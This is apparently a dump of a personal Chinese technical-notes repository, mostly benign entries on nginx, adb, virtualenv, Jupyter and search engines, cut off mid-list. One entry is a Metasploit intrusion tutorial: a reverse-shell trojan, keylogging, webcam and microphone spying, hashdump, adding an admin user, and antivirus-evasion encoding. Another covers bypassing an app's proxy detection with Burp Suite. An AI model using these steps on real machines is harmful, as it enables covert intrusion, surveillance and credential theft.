text/html;\n\t\tcontent_by_lua '\n\t\t\tngx.say(\"<p>third</p>\")\n\t\t';\n \n\t}\n}\n \nserver {\n\tlisten 80;\n\tserver_name ~\\w+.com;\n\tlocation / {\n\t\tdefault_type text/html;\n\t\tcontent_by_lua '\n\t\t\tngx.say(\"<p>forth</p>\")\n\t\t';        \n\t}\n}\n \nserver {\n\tlisten 80;\n\tserver_name ~.*zkh.com;\n\tlocation / {\n\t\tdefault_type text/html;\n\t\tcontent_by_lua '\n\t\t\tngx.say(\"<p>fifth</p>\")\n\t\t';\n\t}\n}\n```\n修改hosts文件\n```\n118.126.100.138 www.zkh.com\n118.126.100.138 www.zkh.org\n118.126.100.138 zkh.com\n118.126.100.138 zkh.org\n```\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210512175600.png\" width=\"700px\"/>\n\n### 匹配顺序\nserver_name与host匹配优先级如下：\n1、完全匹配\n2、通配符在前的，如*.test.com\n3、在后的，如www.test.*\n4、正则匹配，如~^\\.www\\.test\\.com$\n如果都不匹配\n1、优先选择listen配置项后有default或default_server的\n2、找到匹配listen端口的第一个server块"
  },
  {
    "title": "./notes/软件/msf.md",
    "body": "利用msf入侵电脑\n# 1. 准备阶段\n需要的工具\n\nmsfvenom、msfconsole\n\n执行命令：\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<本地IP> LPORT=<本地端口>  -f exe -o hacker.exe\n```\n参数：\n```\n-p payloads\n\n-f 输出格式\n\n-o 输入地址\n\n-e 编码方式（msfvenom -l -encoder 可以查看能使用的编码）\n\n-x | -k 绑定程序 （例如 –x C:\\nomal.exe –k –f exe –o C:\\shell.exe）\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191202161139.png\"/>\n\n注： 上述代码不能拿生成pdf文件， 使用如下代码来生成pdf木马， 这个pdf木马是针对于adobe的一个漏洞，版本为Adobe Reader 8.2.4 - 9.3.4，  所以只有这些版本打开这个pdf木马才有用\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191202174058.png\"/>\n\n即生成后门文件 hacker.exe\n把它放到目标电脑上面（这里我放在WIN10 上面）\n\n如果被攻击的主机为linux， 则需要在linux上为该文件赋予权限chmod 777 hacker.exe\n\n执行命令：\n```\nmsfconsole （运行msfconsole）\nmsf > use exploit/multi/handler （选择模块）\nmsf exploit(handler) > exploit -z -j （后台执行）\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191202161456.png\"/>\n这个时候等待目标打开我们的hacker.exe，打开即上钩了\n```\nmsf exploit(handler) > sessions（查看上钩的用户）\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191202161558.png\"/>\n```\nmsf exploit(handler) > sessions -i 1（选择需要攻击的用户，这里选择第 1 个）\n```\n\n# 2. 攻击\n```\nrun migrate -n explorer.exe  将木马线程迁移到进程explorer.exe上，这样，即使用户关闭了这个木马程序，也不会断开后门的连接。\n\nbackground 将当前会话移动到背景(激活会话： 在msfconsole中输入sessions命令, 然后使用session id号来激活)\n\nshell （执行shell， 对目标主机shell操作）\n\ngetwd (查看所在目标主机的目录)\n\ngetlwd (查看本地目录)\n\nupload /root/ssh.apk C:\\\\   （将/root/ssh.apk文件传到目标主机的C盘下）\n\ndownload C:\\\\1.exe （下载目标主机C盘下的1.exe文件到本地的lwd目录）\n\nuictl           -->控制一些用户界面组件（获取键盘、鼠标控制权）\n使用uictl -h 查看帮助（打开/关闭，键盘/鼠标）\n列： uictl disable mouse  (禁用目标主机的鼠标)\n\nkeyscan_start   -->开始捕获击键（开始键盘记录）\nkeyscan_dump    -->转储按键缓冲（下载键盘记录）\nkeyscan_stop    -->停止捕获击键（停止键盘记录）\nPS：键盘记录注意点，先开始，后下载，再结束，否则会出错\n\nscreenshot      -->抓取交互式桌面截图（当前操作界面截图一张）\n\nnet user wh 123 /add  (给目标主机创建一个用户名为wh,  密码为123的用户，  此时wh用户为普通用户)\nnet localgroup administrators wh /add (将wh用户提权到管理员)\n\nreboot (重启目标电脑)\nshudown (关闭目标电脑)\n\nrecord_mic       -->X秒从默认的麦克风record_mic音频记录（音频录制）\n\nwebcam_chat      -->开始视频聊天（视频，对方会有弹窗）\nwebcam_list      -->单摄像头（查看摄像头列表）\nwebcam_snap      -->采取快照从指定的摄像头（摄像头拍摄一张照片）\nwebcam_stream    -->播放视频流从指定的摄像头（开启摄像头监控）\n\ngetsystem        -->获取高权限\nhashdump         -->获取当前用户hash\n\n```\n\n\n# 3. 木马免杀：\n\n这里使用msfvenom生成木马同时对payload编码来实现木马的简单免杀：\n\n-e 选项用来指定要使用的编码器。\n\n-i 选项用来指定对payload编码的次数。\n\n首先看看有哪些编码器可以使用：\n```\nmsfvenom -l encoders\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191202164329.png\"/>\n\n我们挑选一个免杀效果比较好的x86/shikata_ga_nai进行编码。\n\n```\nmsfvenom -p linux/x86/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f elf -o /root/payload_encoder.elf\n```\n\n从图中我们可以看到完成了对木马的5次编码，这样木马基本上就可以躲避部分杀毒软件的查杀，其实还可以对木马程序进行多次编码，虽然可以提高木马的免杀几率，不过可能会导致木马程序不可用。当然要想免杀效果更好就需要使用Metasploit pro版本或者给木马加壳、修改木马的特征码等等，不过要想躲过全部杀毒软件的查杀则会有些难度，通常会针对某个杀毒软件进行免杀。"
  },
  {
    "title": "./notes/软件/adb.md",
    "body": "# adb识别手机\n当插上手机， 并且启动了USB调试模式，  在电脑上如果出现如下情况即可连接成功\n\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191223112921.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191223113031.png\"/>\n\n如果没有， 则说明电脑上没有该手机的驱动器， 那么可以在网上下载手机对应的驱动器， 或者是手机对应的手机助手，以下以vivo x9与华为为例\nvivo：\n\n在网上下载vivo x9的驱动器\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191223113403.png\"/>\n\n华为：\n在网上下载华为手机助手\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191223113741.png\"/>\n\n# 使用adb卸载vivo自带手机应用\n1. 连接安卓设备\n我们把安卓设备用USB连接PC,手机进入USB调式模式，有些手机进入USB调试模式需要打开开发者模式，而有些手机不需要， 然后在PC上打开CMD，进入adb目录，输入adb devices回车，如果连接正确，如图，会显示已连接设备。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191215083517.png\"/>\n\n如果手机没有显示是否确定进行USB弹框， 那么你可以何使用`adb kill-server`关闭adb服务，然后使用`adb start-server`启动adb服务并查看连接设备\n注： 如果设备后面显示的是`unauthorized`,此时相当于电脑无法识别该手机， 这是由于手机没有进入USB调试模式而引起的\n2. 进入安卓shell\n```\nadb shell\n```\n3. 模糊搜索要卸载的程序的包名并删除\n```\npm list packages | grep '查询的英文包名（模糊查询）'\npm uninstall -k --user 0 xxxx   输入全包名xxxx  不加引号  卸载应用\n```\n-k 表示保存数据，如不需要，可去掉 -k，--user 指定用户 id，Android 系统支持多个用户，默认用户只有一个，id=0。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191215083740.png\"/>\n注意： vivo好像做了一个系统盘监控，有还原功能，卸载了，但一重启，就又都回来了，但可以通过ADB停用，不需要卸载，将不需要的应用停用后，重新启动也不会回来，图标也会消失，需要用的时候再启用，这样也不错。\nadb shell pm disable-user 应用包名 --> 停用\nadb shell pm enable 应用包名 --> 启用\n\n```\n# delete the GameCentre\npm uninstall -k --user 0 com.vivo.game\npm disable-user com.vivo.game\n# vivocloud\npm uninstall -k --user 0 com.bbk.cloud\npm disable-user com.bbk.cloud\n# childrenmode\npm uninstall -k --user 0 com.vivo.childrenmode\npm disable-user com.vivo.childrenmode\n# vivo.com\npm uninstall -k --user 0 com.vivo.space\npm disable-user com.vivo.space\n# iReader\npm uninstall -k --user 0 com.chaozh.iReader\npm disable-user com.chaozh.iReader\n# iMusic\npm uninstall -k --user 0 com.android.bbkmusic\npm disable-user com.android.bbkmusic\n# Browser\npm uninstall -k --user 0 com.vivo.browser\npm disable-user com.vivo.browser\n# Skills\npm uninstall -k --user 0 com.vivo.Tips\npm disable-user com.vivo.Tips\n# Email\npm uninstall -k --user 0 com.vivo.email\npm disable-user com.vivo.email\n# Notes\npm uninstall -k --user 0 com.android.notes\npm disable-user com.android.notes\n# VideoPlayer\npm uninstall -k --user 0 com.android.VideoPlayer\npm disable-user com.android.VideoPlayer\n# appstore\npm uninstall -k --user 0 com.bbk.appstore\npm disable-user com.bbk.appstore\n```\n\n# adb服务器版本与此客户端不匹配错误\n```\nadb server version (31) doesn't match this client (36) adb server version (32) doesn't match this client (36); killing...\n```\n这是由于您使用版本为31的adb启动adb服务器，然后尝试使用版本版本为36连接到此服务器。\n由于版本不一致， 从而会报错"
  },
  {
    "title": "./notes/软件/jupyterNotebook.md",
    "body": "# jupyter notebook配置\n生成配置文件\njupyter notebook --generate-config\n修改默认配置文件\nvi ~/.jupyter/jupyter_notebook_config.py\n```\nc.NotebookApp.ip='*' #设置访问notebook的ip，*表示所有IP，这里设置ip为都可访问  \nc.NotebookApp.open_browser = False # 禁止notebook启动时自动打开浏览器(在linux服务器一般都是ssh命令行访问，没有图形界面的。所以，启动也没啥用)  \nc.NotebookApp.port =8889 #指定访问的端口，默认是8888。\n```\n\n# 添加其他环境\n建立虚拟环境scrapy\n```python\nmkvirtualenv scrapy\n```\n进入虚拟环境scrapy\n```python\nworkon scrapy\n```\n安装jupyter，具体操作略过\n```python\n(scrapy) pip install jupyter\n```\n安装ipykernel，添加kernel\npython -m ipykernel install --user --name 环境名称 --display-name \"显示的名称\"\n\n```python\n(scrapy) pip install ipykernel\n(scrapy) python -m ipykernel install --user --name scrapy --display-name \"Python2(scrapy)\"\n```\n\n之后重启jupyter notebook 就可以了。\n\n在Jupyter Notebook面板Kernel >> Change Kernel >> 你就能看到刚刚添加的内核Python2(scrapy) 了。"
  },
  {
    "title": "./notes/软件/virtualenvwrapper.md",
    "body": "# virtuawenv\nvirtualenv 是一个可以在同一计算机中隔离多个python版本的工具。有时，两个不同的项目可能需要不同版本的python，如 python2.7/ python3.5 ，但是如果都装到一起，经常会导致问题。所以需要一个工具能够将这两种或几种不同版本的环境隔离开来，需要哪个版本就切换到哪个版本做为默认版本。virtualenv 既是满足这个需求的工具。它能够用于创建独立的Python环境，多个Python相互独立，互不影响。\n1. 安装\n```shell\npip install virtualenv\n```\n2. 创建虚拟环境\n```shell\nvirtualenv venv\n```\n为环境指定Python解释器:\n```shell\nvirtualenv -p c:\\python27\\python.exe venv\n```\n3. 激活虚拟环境\n```shell\nactivate venv\n```\n4. 停止虚拟环境\n```shell\ndeactivate\n```\n5. 删除虚拟环境\n直接删除目录即可.\n```shell\nrmvirtualenv venv　\n```\n\n# virtualenvwrapper\nvirtualenvwrapper是virtualenv的扩展管理包，用于更方便管理虚拟环境，它可以做：\n1、将所有虚拟环境整合在一个目录下\n2、管理（新增，删除，复制）虚拟环境\n3、切换虚拟环境\n       关于Virtualenvwrapper和anaconda的安装配置教程，网上有太多太多的，我在自己的其他博客中也有提到，这里就不做赘述啦，只谈正题。\n\n1. 安装virtualenvwrapper\n```shell\npip install virtualenvwrapper-win\n```\n2. 创建虚拟环境\n默认创建的虚拟根目录位于C:\\Users\\username\\envs,可以通过环境变量 WORKON_HOME 来定制。\n通过计算机-->属性-->高级系统设置-->环境变量-->在系统变量中新建“变量名”：WORKON_HOME,变量值：“你自定义的路径”。\n```shell\nmkvirtualenv testvir\n```\n创建了一个名为testvir的虚拟环境，这时就会在你的WORKON_HOME目录下面创建一个名为testvir的文件夹\n\n3. 命令\n所有的命令可使用：virtualenvwrapper --help 进行查看，这里列出几个常用的：\n```shell\n创建基本环境：mkvirtualenv [环境名]\n删除环境：rmvirtualenv [环境名] 或者直接删除对应的目录即可\n激活环境：workon [环境名]\n退出环境：deactivate\n列出所有环境：workon 或者 lsvirtualenv -b\n进入虚拟环境的site-packages目录: cdsitepackages\n列出site-packages目录的所有软件包: lssitepackages\n进入虚拟环境目录: cdvirtualenv\n```\n\n# 在cygwin或powershell中激活virtualenvwrapper\n以管理员身份启动PowerShell，并执行Set-ExecutionPolicy RemoteSigned，可以使用TAB键自动补全。\n```shell\nPS C:\\WINDOWS\\system32> Set-ExecutionPolicy RemoteSigned\n\n执行策略更改\n执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如\nhttp://go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies\n帮助主题所述。是否要更改执行策略?\n[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助\n(默认值为“N”):Y\n```\n之后就会显示上面的选项，输入Y，再回车。\n\n最后进入你要激活的虚拟环境中， 运行Script脚本下的active即可。\n注意：在cygwin中要使用source ./active。  并且再~/.zshrc做如下更改：\n```config\nplugins=(virtualenv)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status virtualenv)\n```\n注意在cygwin中使用python虚拟环境时中的pip查找有关原配置的是在cygwin中的$HOME下查找的， 即$HOME/pip/pip.init中找的（这个HOME是cygwin中的HOME，而不是window的HOME） ，所以要将window下的HOME目录下的pip移到cygwin中的HOME目录下\n在cygwin下创建一个workon.sh\n```shell\n#!/usr/bin/zsh.exe\nif test -z $1; then\n\tworkon.bat\nelse\n\tenvPath=\"F:/envs/$1/Scripts/\"\n\tif [ ! -d $envPath ]; then\n\t\techo \"ERROR: the $1 doesn't exist!\"\n\telse\n\t\tprePaht=`pwd`\n\t\tcd $envPath\n\t\tsource ./activate\n\t\tcd $prePaht\n\tfi\nfi\n```\n然后给这个shell起一个别名\n```bash\nalias workon=\". workon.sh\"\n```\n注： 由于activate中有如下代码：\n```python\nif ! [ -z \"${_OLD_VIRTUAL_PATH:+_}\" ] ; then\n    PATH=\"$_OLD_VIRTUAL_PATH\"\n    export PATH\n    unset _OLD_VIRTUAL_PATH\nfi\n```\n但是在idea中的terminal的环境中这个_OLD_VIRTUAL_PATH默认值为window上的PATH\n所以在~/.zshrc上如下代码， 使其变成cygwin中的PATH\n```conf\nexport _OLD_VIRTUAL_PATH=$PATH\n```\n\n# 在pycharm中使用\n我们先随便新建一个名为“test”的项目：\n下面选择解释器，在选择解释器的时候，我们就可以用Virtualenv和conda来创建虚拟环境，或是利用他们已经创建好的虚拟环境\n![](https://gitee.com/naiswang/images/raw/master/20190922194521.png =600x)\n\n我们先选择conda方式来创建：\n![](https://gitee.com/naiswang/images/raw/master/20190922194557.png =600x)\n\n这样就可以创建项目喽！\n我们再使用virtualenv来创建：\n![](https://gitee.com/naiswang/images/raw/master/20190922194630.png =600x)\n这里有几点说明：\nName中填写新虚拟环境的名字，或者使用默认名字，方便以后安装第三方包和其他项目使用；\n在Location中填写新环境的文件目录;\n在Base interpreter下拉框中选择Python解释器；\n勾选Inherit global site-packages可以使用base interpreter中的第三方库，不选将和外界完全隔离；\n勾选Make available to all projects可将此虚拟环境提供给其他项目使用。\n使用Python一定要用好虚拟环境，pycharm真的是太赞啦，直接给集成了两大虚拟环境配置工具，省去了很多步骤。"
  },
  {
    "title": "./notes/软件/burpSuite.md",
    "body": "# 苹果IOS手机设置BurpSuite抓包\n1. 添加BP的Proxy Listeners\n点击Add添加\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220620144732.png)\n\n端口填写8080，然后选择Specific address，选手机和电脑同时在的那个IP区段\n\n2. 在Intercept Client Requests中勾选\n\nIntercept requests based on the following rules和Automatically......edited，截图如下\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220620144747.png)\n\n3. 手机设置代理\n\n4. 在Safari浏览器中打开网址`电脑ip:8080`下载证书\n打开网页后点击右上角的CA证书进行下载，省去苹果手机的邮箱操作。\n\n5. 手机管理证书\n首先打开设置->通用->关于本机->描述文件\n在里面配置好下载的证书\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220620144804.png)\n\n然后在关于本机->证书信任设置里面开启信任\n\n之后就可以正常抓包了\n\n# 使用BurpSuite进行APP抓包如何绕过代理检测\n最近接手到一个项目，对某客户的iosAPP进行渗透测试，虽然说客户发过来的是测试包，但是开了代理检测，我是怎么知道的呢，当然是先猜到了，后面尝试验证了的。因为开了代理检测，所以我在WIFI属性处设置代理就被检测到了。一设置代理打开APP就提示网络，点击前端功能点皆提示网络错误。代理关闭，APP就可以正常使用。\n关于APP抓不到包可能是以下问题：\n\nSSL证书没配置好\n客户端开启了代理检测\n客户端使用了双向证书校验\n客户端内嵌了自己的VPN\n看到自己遇到的情况，我就猜测可能是前端做了代理检测了。\n\n如果绕过呢？\n有没有思考过一个问题？\n客户端禁止你使用代理，会不会禁止你使用VPN呢？说到代理，作为一个合格的安全人员你应该会联想到中间人流量劫持、中间人攻击。那么VPN也会有这些吗，有时会有但是安全性相对较高。VPN可以走全局的流量，接入远程内网。一个APP你禁止我的流量走代理，但是你总不能不让我用VPN吧。\n于是便有了以下的操作。\n\nBurpSuite开启8080端口http代理，绑定地址为0.0.0.0或者局域网ip。\n在苹果手机上安装小飞机（SS），选择协议为http，连接信息填写BurpSuite的。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220708094037.png)\n"
  },
  {
    "title": "./notes/软件/github.md",
    "body": "# 在github上高效搜索\nin:name example    名字中有“example”\nin:readme example    readme中有“example”\nin:description example    描述中有“example”\n\nstars:>1000    star>1000\nforks:>1000    fork>1000\npushed:>2019-09-01     2019年9月1日后有更新的\n\nlanguage:java    用Java编写的项目\n\n可以通过高级搜索了解这些参数 https://github.com/search/advanced\n\n您无法使用以下通配符作为搜索查询的一部分：. , : ; / \\ ` ' \" = * ! ? # $ & + ^ | ~ < > ( ) { } [ ] @. 搜索只会忽略这些符号\n\n[官方文档](https://docs.github.com/cn/search-github/searching-on-github/searching-code)\n\n\n# 比较不同提交对象之间的不同\n在你的项目地址url后加上compare即可\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162609.png)\n\n每个仓库的比较视图包含两个下拉菜单：base 和 compare。\nbase 应被视为比较的起点，而 compare 被视为终点。 在比较期间，可随时通过单击 Edit（编辑）来更改 base 和 compare 点。\n\n"
  },
  {
    "title": "./notes/软件/搜索引擎.md",
    "body": "# google搜索技巧\n1. `site`：在关键词后加上site:指定的网站 eg:`后浪 site:www.bilibili.com`\n2. `准确搜索`: 给关键词加上英文双引号 eg:`“人工智能算法”`\n3. `排除关键词`：在搜索内容后面加上空格减号需要排除的关键词 eg:`苹果 -iPhone -iPad`\n4. `用OR逻辑搜索`：用大写的OR和空格隔开关键词 eg: `百度 OR 谷歌`\n5. `模糊搜索`：用*代替文字或单词 eg:`study * home`\n6. `filetype`：在关键词后加上filetype:文件类型 eg:`高等数学 filetype:pdf`\n7. `inurl/allinurl`：在关键词后加上inurl:需要筛选的url关键字，allinurl必须同时包含关键词 eg:`肖生克的救赎 inurl:movie film`\n8. `intitle/allintitle`：在关键词后加上intitle:需要筛选的title关键字，allintitle必须同时包含关键词 eg:`machine learning intitle:stanford mit`\n9. `define`：通过define:关键词得到准确定义 eg:`define:internet`\n\n组合示例：`machine learning -vision -drive site:stanford.edu filetype:pdf`\n\n\n# 搜索引擎工作原理\n搜索引擎的工作过程大体可以分为三个阶段：\n1. 对网页进行抓取建库\n搜索引擎蜘蛛通过抓取页面上的链接访问其他网页，将获得的HTML代码存入数据库\n2. 预处理\n索引程序对抓取来的页面数据进行文字提取、中文分词、索引等处理，为后面排名程序使用时做准备。\n3. 给搜索结果进行排名\n用户输入关键词后，排名程序调用索引库数据，计算数据和关键词的相关性，然后按照一定格式生成搜索结果页面。\n\n以上阶段用到了大概三个程序，蜘蛛、索引程序、排名程序\n\n## 对网页进行爬行、抓取、建库\n如果我们要从一个页面进入另一个页面，我们需要在页面上点击这个超链接跳转到新的页面，这个链接指向另一个网页，相当于这个网页的入口\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101222220.png)\n或者如果我们知道这个网页的url地址，就算我们没有在页面上看到链接到该网页的可点击的超链接，也可以通过在地址栏输入url地址转到该页面\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101222303.png)\n\n当我们在一个网站发布了自己的文章，这篇文章会产生一个新的独一无二的url地址，当人们点击这个地址，它不会跳转到其他人写的文章页面，而是你写的特定的那一篇。\n可以看出，所有页面，都会产生一个url地址使我们可以访问它。\n\n整个互联网是由相互链接的页面组成的，如果一个网页，没有任何一个页面链接它，我们也不知道这个网页的地址，就算这个页面真实存在，它也会像一个孤岛一样，我们无法访问到这个页面。\n\n日常生活中我们有多个搜索引擎可以使用，比如百度、谷歌、搜狗、bing等。\n不同的搜索引擎就算查询同一个内容返回出来的结果都不一样，这是因为各个公司给内容进行排序的计算方式都是不一样的，哪个页面该排到第一页/哪个网页该排到最后一页/哪个网页根本就不应该展示出来都是有他们公司自己的评判标准，这些排名算法具体的内容基本都不会对外公开，避免被其他公司搜索引擎公司知道，因为排名算法是每个搜索引擎公司的核心竞争力。\n\n**为什么排名算法是每个搜索引擎公司的核心竞争力?**\n一般人们都会看哪个搜索引擎搜索出来的结果更符合TA自己的需求（相关性更高）就会选择长期使用哪一个。\n比如，你在搜索输入框里输入【空调】两个字想查询关于空调的信息，结果搜索结果页给你返回的内容第一页竟然是一些电视机/马桶/衣柜之类的销售链接，这样相关性不高的网页越多，对你的使用体验就越差，最好的体验是，你搜索【空调】后，返回的页面里全是关于空调的信息，这样节约了你获取信息的时间成本，使你更方便的获取想要的资讯。\n而排名算法就是为了让返回的结果尽量符合用户查询的内容的一种算法，他会对网页进行排名，把觉得对用户最有价值的网页排在前面，比如第一页第一个，用户能最快的看到这个网页，把相关性较差不重要的网页排在后面。把那些没有用的没有价值的页面直接不展示出来，经过对这些网页的排序，让用户尽量在只看第一页的情况下就能找到自己想要的资讯，解决掉自己的问题。\n所以搜索引擎公司只要能对网页进行合理的排序，带给用户最大的方便，让用户感觉到返回的内容都很精准，正好是他们想要的内容，那么用户就会持续使用这个搜索引擎，所以如何对这些网页进行排序的计算方式就是每个搜索引擎公司的公司机密了。\n\n爬行和抓取搜索引擎工作的第一步，目的是完成数据收集的任务。\n当用户在搜索框输入想查询的内容后，所有展示出来的网页都是需要先经过搜索引擎的收集才能展示出来的，只有收集了，才能通过分析网页中的内容，对这些网页的价值和相关性进行一个判断，经过对网页的排序之后再返回给用户，用户在搜索结果页上看到的所有网页，都是已经被搜索引擎收集进数据库中的网页。\n而那些互联网上没有被搜索引擎收集到的网页（搜索引擎不是什么网页都会放进数据库，每个搜索引擎都有自己的一个标准，就是什么样的网页才会被收集到数据库中。就像人类吃东西一样，只吃自己认为该吃的食物），就变成了永远无法访问的孤魂野鬼。\n注：网页和网站的区别需要注意，蜘蛛在判断需不需要收集进索引数据库的是以网页为单位的。\n比如整个淘宝是一个网站，但是淘宝中某一个商品的详情页面才算网页，还比如你现在所看的这篇文章所在的这一个页面才算网页。\n所以，整个淘宝网站的页面那么多，蜘蛛在收集网页时，就算收集了A商品那页详情页面，但不代表B商品详情页面也被收集进索引数据库了，蜘蛛会对每个页面进行评判，只有该页面到达他的标准了，认为可以收集到索引数据库里了，才会把这个页面添加进去，而不是它认为淘宝这个网站很有价值，就把整个网站里所有页面全部收录进去了，SEO里有个概念叫做收录率，指的是页面的收录率，而不是网站的收录率。\n\n### 蜘蛛\n搜索引擎用来爬行和访问页面的程序叫做蜘蛛/爬虫（spider），或机器人（bot）。\n蜘蛛访问网站页面的流程和人们在浏览器上访问页面的流程差不多，蜘蛛访问页面时，会发出页面访问请求，服务器会返回HTML代码，蜘蛛把收到的HTML代码存入原始页面数据库。\n\n互联网上的页面这么多，为了提高爬行和抓取的速度，搜索引擎会同时使用多个蜘蛛对页面进行爬行。\n\n理论上来说，互联网上的所有页面（这里指的是通过超链接互联链接在一起的页面，而不是那种虽然这个页面存在，但是没有任何网页用超链接指向他），蜘蛛都可以沿着页面上的超链接将所有页面爬行一遍，但是蜘蛛不会这么做，蜘蛛的时间有限，它会用效率最高的方式找到互联网上它觉得最有价值的网页。\n如果一个网站的页面普遍质量较低，蜘蛛就会认为这是一个低质网站，让用户阅读这类没有价值的网页是没有必要的，对于这类网页，它会减少爬行的频率，将重点放在其他质量更高的网站，去其他更有价值的网站上收集网页存入数据库。\n\n但是蜘蛛不是全能，它也有评判错误的时候，比如蜘蛛不会收集空短页面，也就是内容空洞毫无营养，主体内容又短的页面，蜘蛛不会浪费数据库的空间放入这些网页。\n\n但是一个页面究竟是不是真正的无价值网页，蜘蛛判断成功的正确率并不是100%，就像一个登录验证网页，确实没有比那些传递知识的网页更有价值，但是这是大部分网站一个必不可少的一个页面，严格来说并不是低质页面，但是如果蜘蛛爬行到了这个页面，它并不理解人类眼中的验证页面是一个怎样的存在，他只觉得，内容短，没什么丰富的内容，好，那就是无价值的网页了，它就像有一个专门用来记录的小本本一样，嗯，A网站，有一个低质页面，给这个网站评价好还是不好我还要在考虑一下，如果这样的低质页面多了，蜘蛛就会觉得你的网站整体质量较低，慢慢的就不爱到你网站上抓取网页了。\n\n##### robots协议\n所以为了避免上述情况，不让蜘蛛抓取这些网页是最好的办法，我们可以在项目根目录创建一个txt文件，这个文件叫什么是有约定俗成的，文件名必须为 robots.txt，我们在文件里面规定好蜘蛛可以爬行/不能爬行哪些网页就行。这被称为robots协议\n\n当蜘蛛访问任何一个网站的时候，第一件事就是先访问这个网站根目录下的robots.txt文件，如果文件里说了禁止让蜘蛛抓取XX文件/XX目录，蜘蛛就会按照文件里规定的那样，只抓取可以抓取的页面。\n\n例如：taobao.com就在robots.txt中明确规定了禁止百度爬虫爬取\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101225253.png)\n我们通过百度搜索淘宝，出现如下画面，说明百度爬虫遵守了淘宝的robots协议\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101225519.png)\n\n### 蜘蛛的分类\n每个搜索引擎公司都有自己的蜘蛛，这些蜘蛛喜好不一，喜欢抓取什么类型的网页要看他们的主人，也就是要看搜索引擎公司他们的想法，虽然这些蜘蛛统称为蜘蛛，但他们属于不同的主人，当然名字肯定是不一样的。\n\n在日志文件中可以看到有哪些公司的蜘蛛来访问过网站（user-agent那个）\n蜘蛛主要分为下面几个：\n- 百度蜘蛛 Baiduspider\n- 谷歌蜘蛛 Googlebot\n- 有道蜘蛛 YodaoBot\n理论上来说，随便找一个页面，顺着这个页面，蜘蛛可以将互联网上所有的页面都爬一遍\n实际上这样确实是可行的（除去那些没有被任何一个网页所指向的页面），而蜘蛛是如何做到的呢？\n\n比如，蜘蛛先从A页面开始，它爬行到A页面上，它可以获取到A页面中所有的超链接，蜘蛛再顺着这个链接进入到链接所指向的页面，再获取到这个页面上所有的超链接进行爬行抓取，这样一来，所有用超链接所关联上的网页便可以被蜘蛛都爬行一遍。\n\n蜘蛛在爬行时，也是有自己的爬行策略的，就像吃西瓜，把整个西瓜切一半切成一个半圆体，我们选择吃西瓜的方式可以深度优先，随便从中间还是边缘开始吃都行，比如先从中间吃，西瓜中间底下全部挖干净了再围着中间的圆圈慢慢往外面扩散。或者广度优先，从中间或者是边缘随便哪里开始都行，把表面一层挖完了西瓜再进行下一个深度的挖取。\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101222851.png)\n\n### 蜘蛛的爬行策略\n蜘蛛的爬行策略和挖西瓜一样，都是两种方式\n- 深度优先\n- 广度优先\n\n深度优先如下图\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101223001.png)\n蜘蛛先从A页面开始爬行，发现该页面总共有3个超链接，A1、B1、XX，蜘蛛选择先从A1页面爬行下去，它在A1页面发现了一个唯一的超链接A2，便沿着A2向下，以此类推，等爬到最底下，也就是A4页面，A4整个页面上没有任何超链接，再也无法往下爬行了，它便返回到B1开始爬行，这就是深度优先。\n\n广度优先如下\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101223024.png)\n\n这次这是一个利用广度优先策略的蜘蛛，它先从A页面出发，现在A页面有3个链接，A1、B1、C1，它会先把A1、B1、C1先爬一遍，也就是第一层发现的超链接全部爬行完，然后再进入第二层，也就是A1页面。把A1页面中所有的超链接全部爬行一遍，保证广度上全部链接是都完成爬行了的。\n无论是深度优先还是广度优先，蜘蛛都可以通过这两个策略完成对整个互联网页面的爬行。\n当然，由于蜘蛛的带宽资源和时间有限的问题，蜘蛛不会选择爬完所有页面，它实际收集到的页面知识互联网的一小部分，在条件限制的情况下，蜘蛛通常会深度优先和广度优先混合使用，广度优先保证了尽可能照顾到多的网站，而广度优先保证了尽可能照顾到一部分网站中的内页。\n\n### 吸引蜘蛛抓取页面\n可以看出，在实际情况中，蜘蛛不会爬行、抓取互联网上所有的页面，既然如此，蜘蛛所要做的就是尽量抓取重要页面，而SEO人员要做的，就是吸引蜘蛛的注意，让蜘蛛更多的抓取自己家网站的页面。\n\n对于蜘蛛来说，页面拥有哪些特征会被看作是重要页面呢，主要有以下这几方面因素：\n1. 网站和页面权重\n质量高，资格老的网站被认为权重较高，这种网站上页面的爬行深度也会比较高，所以这种网站网页被收录的机会会更多。\n\n2. 页面更新度\n如A网页的数据之前在蜘蛛爬行后已经被保存在数据库中了，当蜘蛛第二次爬行A网页时，会将A网页此时的数据和数据库中的数据进行对比，如果蜘蛛发现A网页的内容更新了，就会认为这个网页更新频率多，蜘蛛抓取这个页面的频率也会更加频繁，如果页面和上次储存的数据完全一样，就说明页面是没更新，蜘蛛就会减少自己爬行该页面的频率。\n\n3. 